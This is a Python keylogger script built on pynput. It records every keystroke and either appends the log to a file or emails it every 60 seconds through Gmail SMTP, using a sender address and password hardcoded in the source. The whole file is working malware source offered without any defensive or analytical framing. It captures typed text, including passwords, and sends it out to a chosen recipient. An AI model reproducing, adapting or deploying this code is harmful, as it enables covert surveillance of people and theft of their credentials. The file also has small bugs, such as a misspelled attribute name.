import pynput
import threading
import getopt
import sys
import smtplib

class Keylogger:
    def __init__(self):
        self.argument_list = sys.argv[1:]
        self.options = "hf:e:"
        self.long_options = ["help","output-file=","email="]

        self.log = ""
        self.receiver = ""
        self.fil1 = ""

        self.choose_report_method = 0

        try:
            arguments, values = getopt.getopt(self.argument_list, self.options, self.long_options)

            for currentArgument, currentValue in arguments:
                if currentArgument in ("-h", "--help"):
                    print("Usage: python keylogger.py [-h or --help for help] [-f or --output-file file-name, for file to write output to] [-e or --email \"email address\", for email to send outputs to]")
                    exit()
                    
                if currentArgument in ("-f", "--output-file"):
                    print("Writing output to file: %s" % currentValue)
                    self.file1 = open(currentValue, "a")
                    self.choose_report_method = 0
                    self.timer = threading.Timer(60, self.report_file)  

                if currentArgument in ("-e", "--email"):
                    print("Sending emails to (every 60 seconds): " + currentValue)
                    self.receiver = currentValue
                    self.choose_report_method = 1
                    self.timer = threading.Timer(60, self.report_mail)  
                    
        except getopt.error as err:
            print(str(err))
            exit()


    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, self.receiver, message)
        server.quit()

    def report_mail(self):
        self.send_mail("keyloggeroutput81@gmail.com", "keylogger123", self.log)
        self.log = ""
    
    def report_file(self):
        self.file1.write(self.log)
        self.log = ""

    def process_key_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            self.log += str(key) + " "
        print(self.log)

    def process_key_release(self, key):
        if key == pynput.keyboard.Key.end:
            # Stop listener and timer
            self.timer.cancel()
            self.file1.close()
            exit()

    def start(self):
        try:
            self.timer.start()
            key_listener = pynput.keyboard.Listener(on_press=self.process_key_press, on_release=self.process_key_release)
            # Collect events 
            with key_listener:
                if self.choose_report_method == 0: self.report_file()
                else: self.report_mail()
                key_listener.join()
        except AttributeError:
            print("-h for help")